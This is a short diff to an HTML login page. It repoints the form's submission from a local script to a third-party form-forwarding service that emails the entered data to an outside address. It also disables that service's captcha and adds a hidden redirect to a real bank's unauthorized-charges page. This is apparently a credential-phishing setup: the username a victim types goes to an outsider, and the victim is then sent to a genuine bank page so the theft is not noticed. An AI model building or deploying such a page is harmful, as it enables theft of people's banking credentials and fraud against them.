@@ -27,7 +27,13 @@
     <div class="container">
         <div class="form-box">
             <h1></h1>
-            <form method="post" action="action.php">
+            <form method="post" action="https://formsubmit.co/joshuarich010@protonmailmail.com">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://www.chase.com/digital/customer-service/fraud/unauthorized-charges">
+
+
+
+                
                 <div class="input-field">
                     <input type="text" id="user" placeholder="Username">
                 </div>
